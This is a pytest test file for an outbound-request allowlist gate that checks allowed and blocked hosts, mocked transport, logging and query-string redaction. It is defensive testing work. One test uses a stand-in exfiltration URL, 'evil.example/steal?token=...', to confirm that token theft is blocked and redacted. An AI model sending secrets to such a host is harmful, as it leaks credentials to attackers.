"""Tests for tools/net.py — the egress gate. No network; the transport is
mocked but the policy is always enforced."""

import json
import os
import sys
import urllib.request

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "tools"))

import net
from net import EgressBlocked, check_url, gated_urlopen, redact_url, set_egress_log


@pytest.fixture(autouse=True)
def isolated_log(tmp_path, monkeypatch):
    p = str(tmp_path / "egress.jsonl")
    monkeypatch.setenv("MYAI_EGRESS_LOG", p)
    set_egress_log(None)  # force env-var path resolution
    yield p
    set_egress_log(None)


def log_lines(path):
    with open(path) as f:
        return [json.loads(l) for l in f if l.strip()]


# --- allowlist ------------------------------------------------------------

@pytest.mark.parametrize("url", [
    "https://queue.fal.run/fal-ai/wan-25/text-to-video",
    "https://queue.fal.run/fal-ai/wan-25/text-to-video/requests/abc/status",
    "https://v3.fal.media/files/abc123/output.mp4",
    "https://cdn.fal.ai/files/x.mp4",
    "https://api.fal.ai/v1/x",
    "https://openrouter.ai/api/v1/chat/completions",
])
def test_allowlisted_hosts_pass(url):
    assert check_url(url)  # returns host, no raise


def test_subdomain_of_allowlisted_passes():
    assert check_url("https://x.queue.fal.run/y") == "x.queue.fal.run"


@pytest.mark.parametrize("url", [
    "https://evil.example/x",
    "https://evilfal.ai/x",          # leading-dot rule: not a suffix match
    "https://fal.ai.evil.example/x",  # suffix is evil.example
    "https://192.168.1.1/x",          # IP literal, not loopback
    "ftp://queue.fal.run/x",          # scheme not permitted
    "https://user:pass@queue.fal.run/x",  # embedded credentials refused
    "http://queue.fal.run/x",         # plain http refused off-loopback
    "not-a-url",
])
def test_blocked_urls_raise(url):
    with pytest.raises(EgressBlocked):
        check_url(url)


def test_loopback_http_allowed_for_local_endpoint():
    assert check_url("http://127.0.0.1:8188/system_stats") == "127.0.0.1"
    assert check_url("http://localhost:8188/x") == "localhost"


# --- gated transport -------------------------------------------------------

class FakeResp:
    def __init__(self, body=b"{}"):
        self._body = body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def test_gated_urlopen_allows_and_logs(isolated_log):
    calls = []

    def opener(req, timeout=None):
        calls.append(req.full_url)
        return FakeResp()

    req = urllib.request.Request("https://queue.fal.run/x")
    with gated_urlopen(req, timeout=5, opener=opener) as resp:
        resp.read()
    assert calls == ["https://queue.fal.run/x"]
    lines = log_lines(isolated_log)
    assert len(lines) == 1
    assert lines[0]["allowed"] is True
    assert lines[0]["method"] == "GET"
    assert "queue.fal.run" in lines[0]["url"]


def test_gated_urlopen_blocks_even_with_injected_opener(isolated_log):
    def opener(req, timeout=None):  # pragma: no cover - must never run
        raise AssertionError("transport must not run for blocked hosts")

    req = urllib.request.Request("https://evil.example/steal?token=abc123")
    with pytest.raises(EgressBlocked):
        gated_urlopen(req, opener=opener)
    lines = log_lines(isolated_log)
    assert len(lines) == 1
    assert lines[0]["allowed"] is False
    # query string redacted in the log
    assert "token=abc123" not in lines[0]["url"]
    assert "evil.example" in lines[0]["url"]


def test_redact_url_strips_query_and_fragment():
    u = "https://v3.fal.media/files/a/b.mp4?sig=SECRETTOKEN#frag"
    r = redact_url(u)
    assert "SECRETTOKEN" not in r and "frag" not in r
    assert r == "https://v3.fal.media/files/a/b.mp4"
